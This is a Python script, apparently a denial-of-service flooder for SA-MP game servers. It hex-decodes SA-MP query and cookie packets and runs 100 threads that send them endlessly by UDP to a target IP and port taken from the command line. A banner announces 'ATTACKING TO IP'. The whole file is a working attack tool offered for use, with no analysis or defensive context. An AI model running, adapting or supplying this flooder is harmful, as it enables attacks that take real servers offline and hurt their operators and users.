import socket
import struct
import codecs,sys
import threading
import random
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip

databs = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]
       
print("##########################")
print(" - Coded WZ - ")
print("##########################")
os.system('cls' if os.name == 'nt' else 'clear')
time.sleep(5)              
print("""\u001b[31m
███████╗██╗░░██╗██████╗░
██╔════╝╚██╗██╔╝██╔══██╗
█████╗░░░╚███╔╝░██████╔╝
██╔══╝░░░██╔██╗░██╔═══╝░
███████╗██╔╝╚██╗██║░░░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░░░
""")
print("\u001b[31m EXPERIENCE\u001b[31m ATTACKING TO IP\033[0m {}\u001b[31m ON PORT\033[0m {}\033[0m".format(orgip, port))

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                msg = databs[random.randrange(0,3)]
                sock.sendto(msg, (ip, int(port)))
                if(int(port) == 7777):
                    sock.sendto(databs[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(databs[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(databs[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(databs[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(databs[9], (ip, int(port)))    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""\u001b[31m
███████╗██╗░░██╗██████╗░
██╔════╝╚██╗██╔╝██╔══██╗
█████╗░░░╚███╔╝░██████╔╝
██╔══╝░░░██╔██╗░██╔═══╝░
███████╗██╔╝╚██╗██║░░░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░░░
""")
         print("\u001b[31m EXPERIENCE\u001b[31m ATTACKING TO IP\033[0m {}\u001b[31m HAS BEEN STOPPED\033[0m".format(orgip))
         pass
